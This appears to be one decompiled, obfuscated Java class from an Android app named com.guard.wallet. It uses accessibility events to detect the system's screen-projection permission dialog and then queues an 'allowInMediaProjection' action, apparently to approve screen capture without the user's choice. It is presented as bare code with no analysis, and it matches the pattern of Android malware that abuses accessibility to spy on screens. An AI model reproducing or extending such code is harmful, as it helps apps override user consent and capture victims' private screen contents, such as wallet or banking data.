package p012o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.thread.AbstractC0243l;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;

/* renamed from: o.o */
/* loaded from: classes.dex */
public final class C0426o extends C0416e {

    /* renamed from: o */
    public static final /* synthetic */ int f941o = 0;

    /* renamed from: n */
    public final ConcurrentLinkedQueue f942n;

    public C0426o() {
        super(Collections.singletonList(m1133H()), "com.android.systemui");
        this.f942n = new ConcurrentLinkedQueue();
    }

    /* renamed from: H */
    public static ListenWindow m1133H() {
        ListenWindow listenWindow = new ListenWindow("com.android.systemui", "com.android.systemui.media.MediaProjectionPermissionActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        AbstractC0243l.m591a(this.f864c);
        this.f942n.clear();
        super.mo1001d();
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        super.mo1002u(accessibilityEvent, str, str2);
        if (m1078q(Collections.singletonList(m1133H()))) {
            Log.d("o.o", "已进入是否允许屏幕投影权限窗口");
            z2 = true;
        } else {
            z2 = false;
        }
        if (z2) {
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f942n;
            if (concurrentLinkedQueue.contains("allowInMediaProjection")) {
                return;
            }
            concurrentLinkedQueue.add("allowInMediaProjection");
            AbstractC0243l.m593c(new RunnableC0412a(this, 3), this.f864c);
        }
    }
}
